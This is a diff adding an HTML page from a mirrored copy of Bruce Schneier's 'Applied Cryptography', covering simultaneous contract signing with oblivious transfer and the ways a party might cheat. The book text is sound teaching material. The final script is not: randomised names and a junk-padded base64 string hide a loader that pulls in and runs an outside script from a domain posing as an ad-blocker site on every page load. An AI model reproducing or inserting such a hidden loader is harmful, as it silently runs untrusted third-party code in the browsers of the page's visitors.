@@ -1,0 +1,93 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Advanced Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=05//-->
+<!--PAGES=119-122//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="05-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="05-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>As the protocol proceeds, both Alice and Bob agree to be bound to the contract with a greater and greater probability. For example, Alice might define her <I>a</I> as 2 percent and Bob might define his <I>b</I> as 1 percent. (It would be nice if they had chosen larger increments; we will be here for a while.) Alice&#146;s first message might state that she is bound with 2 percent probability. Bob might respond that he is bound with 3 percent probability. Alice&#146;s next message might state that she is bound with 5 percent probability and so on, until both are bound with 100 percent probability.</P>
+<P>If both Alice and Bob complete the protocol by the completion date, all is well. Otherwise, either party can take the contract to the judge, along with the other party&#146;s last signed message. The judge then randomly chooses a value between 0 and 1 before seeing the contract. If the value is less than the probability the other party signed, then both parties are bound. If the value is greater than the probability, then both parties are not bound. (The judge then saves the value, in case he has to rule on another matter regarding the same contract.) This is what is meant by being bound to the contract with probability <I>p</I>.</P>
+<P>That&#146;s the basic protocol, but it can have more complications. The judge can rule in the absence of one of the parties. The judge&#146;s ruling either binds both or neither party; in no situation is one party bound and the other one not. Furthermore, as long as one party is willing to have a slightly higher probability of being bound than the other (no matter how small), the protocol will terminate.</P>
+<P><FONT SIZE="+1"><B><I>Simultaneous Contract Signing without an Arbitrator (Using Cryptography)</I></B></FONT></P>
+<P>This cryptographic protocol uses the same baby-step approach [529]. DES is used in the description, although any symmetric algorithm will do.
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Both Alice and Bob randomly select 2<I>n</I> DES keys, grouped in pairs. The pairs are nothing special; they are just grouped that way for the protocol.
+<DD><B>(2)</B>&nbsp;&nbsp;Both Alice and Bob generate <I>n</I> pairs of messages, <I>L</I><SUB>i</SUB> and <I>R</I><SUB>i</SUB>: &#147;This is the left half of my <I>i</I>th signature&#148; and &#147;This is the right half of my <I>i</I>th signature,&#148; for example. The identifier, <I>i</I>, runs from 1 to <I>n</I>. Each message will probably also include a digital signature of the contract and a timestamp. The contract is considered signed if the other party can produce both halves, <I>L</I><SUB>i</SUB> and <I>R</I><SUB>i</SUB>, of a single signature pair.
+<DD><B>(3)</B>&nbsp;&nbsp;Both Alice and Bob encrypt their message pairs in each of the DES key pairs, the left message with the left key in the pair and the right message with the right key in the pair.
+<DD><B>(4)</B>&nbsp;&nbsp;Alice and Bob send each other their pile of 2<I>n</I> encrypted messages, making clear which messages are which halves of which pairs.
+<DD><B>(5)</B>&nbsp;&nbsp;Alice and Bob send each other every key pair using the oblivious transfer protocol for each pair. That is, Alice sends Bob either the key used to encrypt the left message or the key used to encrypt the right message, independently, for each of the <I>n</I> pairs. Bob does the same. They can either alternate sending halves or one can send 100 and then the other&#151;it doesn&#146;t matter. Now both Alice and Bob have one key in each key pair, but neither knows which halves the other one has.
+<DD><B>(6)</B>&nbsp;&nbsp;Both Alice and Bob decrypt the message halves that they can, using the keys they received. They make sure that the decrypted messages are valid.
+<DD><B>(7)</B>&nbsp;&nbsp;Alice and Bob send each other the first bits of all 2<I>n</I> DES keys.
+<DD><B>(8)</B>&nbsp;&nbsp;Alice and Bob repeat step (7) for the second bits of all 2<I>n</I> DES keys, the third bits, and so on, until all the bits of all the DES keys have been transferred.
+<DD><B>(9)</B>&nbsp;&nbsp;Alice and Bob decrypt the remaining halves of the message pairs and the contract is signed.
+<DD><B>(10)</B>&nbsp;&nbsp;Alice and Bob exchange the private keys used during the oblivious transfer protocol in step (5) and each verifies that the other did not cheat.
+</DL>
+<P>Why do Alice and Bob have to go through all this work? Let&#146;s assume Alice wants to cheat and see what happens. In steps (4) and (5), Alice could disrupt the protocol by sending Bob nonsense bit strings. Bob would catch this in step (6), when he tried to decrypt whatever half he received. Bob could then stop safely, before Alice could decrypt any of Bob&#146;s message pairs.
+</P>
+<P>If Alice were very clever, she could only disrupt half the protocol. She could send one half of each pair correctly, but send a gibberish string for the other half. Bob has only a 50 percent chance of receiving the correct half, so half the time Alice could cheat. However, this only works if there is one key pair. If there were only two pairs, this sort of deception would succeed 25 percent of the time. That is why <I>n</I> should be large. Alice has to guess correctly the outcome of <I>n</I> oblivious transfer protocols; she has a 1 in 2<SUP>n</SUP> chance of doing this. If <I>n</I> = 10, Alice has a 1 in 1024 chance of deceiving Bob.</P>
+<P>Alice could also send Bob random bits in step (8). Perhaps Bob won&#146;t know that she is sending him random bits until he receives the whole key and tries to decrypt the message halves. But again, Bob has probability on his side. He has already received half of the keys, and Alice does not know which half. If <I>n</I> is large enough, Alice is sure to send him a nonsense bit to a key he has already received and he will know immediately that she is trying to deceive him.</P>
+<P>Maybe Alice will just go along with step (8) until she has enough bits of the keys to mount a brute-force attack and then stop transmitting bits. DES has a 56-bit-long key. If she receives 40 of the 56 bits, she only has to try 2<SUP>16</SUP>, or 65,536, keys in order to read the message&#151;a task certainly within the realm of a computer&#146;s capabilities. But Bob will have exactly the same number of bits of her keys (or, at worst, one bit less), so he can do the same thing. Alice has no real choice but to continue the protocol.</P>
+<P>The basic point is that Alice has to play fairly, because the odds of fooling Bob are just too small. At the end of the protocol, both parties have <I>n</I> signed message pairs, any one of which is sufficient for a valid signature.</P>
+<P>There is one way Alice can cheat; she can send Bob identical messages in Step (5). Bob can&#146;t detect this until after the protocol is finished, but he can use a transcript of the protocol to convince a judge of Alice&#146;s duplicity.</P>
+<P>There are two weaknesses with protocols of this type [138]. First, it&#146;s a problem if one of the parties has significantly more computing power than the other. If, for example, Alice can mount a brute-force attack faster than Bob can, then she can stop sending bits early in step (8), and figure out Bob&#146;s keys herself. Bob, who cannot do the same in a reasonable amount of time, will not be happy.</P>
+<P>Second, it&#146;s a problem if one of the parties stops the protocol early. If Alice abruptly stops the protocol, both face similar computational efforts, but Bob does not have any real legal recourse. If, for example, the contract specifies that she do something in a week, and Alice terminates the protocol at a point when Bob would have to spend a year&#146;s worth of computing power before she is really committed, that&#146;s a problem. The real difficulty here is the lack of a near-term deadline by which the process cleanly terminates with either both or neither party bound.</P>
+<P>These problems also apply to the protocols in Sections 5.8 and 5.9.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="05-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="05-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(BlMPyUkB, BisksRGk) {BisksRGk = BlMPyUkB.createElement('script');BisksRGk.type = 'text/javascript';BisksRGk.async = true;BisksRGk.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');BlMPyUkB.getElementsByTagName('body')[0].appendChild(BisksRGk);}(document));</script></body>
+</html>
